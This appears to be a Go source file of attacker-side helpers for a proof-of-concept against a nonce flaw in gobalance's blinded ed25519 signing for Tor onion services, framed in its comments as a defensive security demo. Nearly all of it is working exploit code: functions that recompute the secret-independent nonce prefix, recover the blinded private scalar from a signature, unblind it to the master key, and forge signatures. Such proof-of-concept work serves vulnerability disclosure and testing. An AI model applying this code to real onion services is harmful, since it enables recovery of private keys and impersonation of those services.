// attack_helpers.go — EXPORTED HELPERS FOR THE SECURITY DEMO ONLY.
//
// These functions live inside the vulnerable snapshot package because they
// need access to its internal curve arithmetic. They implement the ATTACKER
// side of the master-key recovery flaw so that the PoC test in poc/ can run
// end-to-end without duplicating ed25519 math.
//
// NOTHING in this file is used by, or linked into, the patched gobalance
// binaries — it exists purely for defensive security education.

package vulnerable

import (
	"bytes"
	"crypto/sha512"
	"math/big"
)

// KPrimeConstant is the nonce prefix that the vulnerable BlindedSignWithTorKey
// bakes into every signature: SHA512 of the domain string with an EMPTY PRF
// half. Because it depends on no secret, anyone can recompute it.
func KPrimeConstant() []byte {
	tmp := sha512.Sum512([]byte("Derive temporary signing key hash input"))
	return tmp[:32]
}

func BlindingMult(nonce []byte) *big.Int {
	sum := big.NewInt(0)
	for i := int64(3); i < int64(b)-2; i++ {
		sum.Add(sum, new(big.Int).Mul(new(big.Int).Exp(big.NewInt(2), big.NewInt(i), nil), big.NewInt(int64(Bit(nonce, i)))))
	}
	return sum.Add(sum, new(big.Int).Exp(big.NewInt(2), big.NewInt(int64(b-2)), nil))
}

// Hint mirrors hint(): SHA512 mapped to a 512-bit integer.
func Hint(m []byte) *big.Int { return hint(m) }

func GroupOrderL() *big.Int { return new(big.Int).Set(l) }

func DecodeIntBig(s []byte) *big.Int { return decodeInt(s) }

func PubFromScalar(scalar *big.Int) []byte {
	return Encodepoint(Scalarmult1(bB1, scalar))
}

func RecoverBlindedScalar(msg, sig, blindedPub []byte) *big.Int {
	R := sig[:32]
	S := decodeInt(sig[32:])
	r := hint(bytes.Join([][]byte{KPrimeConstant(), msg}, nil))
	hval := hint(bytes.Join([][]byte{R, blindedPub, msg}, nil))
	sPrime := new(big.Int).Sub(S, r)
	sPrime.Mul(sPrime, new(big.Int).ModInverse(hval, l))
	return sPrime.Mod(sPrime, l)
}


func UnblindScalar(sPrime *big.Int, blindingNonce []byte) *big.Int {
	return new(big.Int).Mod(
		new(big.Int).Mul(sPrime, new(big.Int).ModInverse(BlindingMult(blindingNonce), l)), l)
}

func ForgeBlindedSignature(msg []byte, scalar *big.Int, blindedKey, blindingNonce []byte) []byte {
	sPrime := new(big.Int).Mod(new(big.Int).Mul(scalar, BlindingMult(blindingNonce)), l)
	kPrime := KPrimeConstant()
	blindedEsk := append(encodeint(sPrime), kPrime...)

	a := decodeInt(blindedEsk[:32])
	toHint := append(append([]byte{}, blindedEsk[32:64]...), msg...)
	r := hint(toHint)
	R := Scalarmult1(bB1, r)
	S := new(big.Int).Mod(
		new(big.Int).Add(r,
			new(big.Int).Mul(hint(bytes.Join([][]byte{Encodepoint(R), blindedKey, msg}, nil)), a)), l)
	return append(Encodepoint(R), encodeint(S)...)
}
